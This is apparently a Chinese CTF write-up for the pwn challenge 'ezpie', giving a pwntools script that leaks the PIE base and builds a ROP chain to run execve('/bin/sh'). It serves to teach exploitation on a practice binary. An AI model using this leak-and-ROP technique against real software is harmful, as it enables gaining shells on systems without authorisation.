## ezpie


***

出题人：kadelin

![image-20240413224442106](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224442106.png)

题目描述：两次读入，一次输入，借助第一吃读入泄露elf_base，接着计算gadget地址构造rop链即可getshell

题目提示：可泄露elf_base

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io = process('./ezpie')

io.recv()
io.send(b'a'*0x28)

io.recv(0x2f)
elf = u64(io.recv(6).ljust(8, b'\x00')) - 0x1189
pop_rdi = elf + 0x00000000000012a3
pop_rsi_r15 = elf + 0x00000000000012a1
pop_rax = elf + 0x0000000000001238
syscall = elf + 0x0000000000001236
binsh = elf + 0x00002008

io.recv()

payload = b'a'*0x58 + p64(pop_rdi) + p64(binsh) + p64(pop_rsi_r15) + p64(0)*2 + p64(pop_rax) + p64(0x3b) + p64(syscall)
io.sendline(payload)


io.interactive()



```







